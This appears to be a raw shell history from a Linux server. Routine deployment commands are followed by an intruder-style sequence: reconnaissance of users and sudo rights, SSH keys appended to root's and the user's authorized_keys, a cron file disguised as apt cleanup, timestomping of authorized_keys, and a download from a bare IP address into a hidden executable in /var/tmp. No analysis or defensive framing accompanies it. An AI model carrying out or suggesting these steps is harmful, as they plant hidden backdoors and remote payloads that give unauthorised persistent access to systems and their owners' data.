make deploy
tail -f /var/log/app/app.log
sudo systemctl restart app
git pull
cd app
systemctl status app
ls
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAyz8VSeon3pKsvj2VtSsmONU8K7m1rVHjjFlth9mg10 ops@build' | sudo tee -a /root/.ssh/authorized_keys
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAyz8VSeon3pKsvj2VtSsmONU8K7m1rVHjjFlth9mg10 ops@build' >> ~/.ssh/authorized_keys
sudo tee -a /etc/cron.d/apt-cache-clean
touch -r /etc/hostname /root/.ssh/authorized_keys
wget -q http://141.239.16.115/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
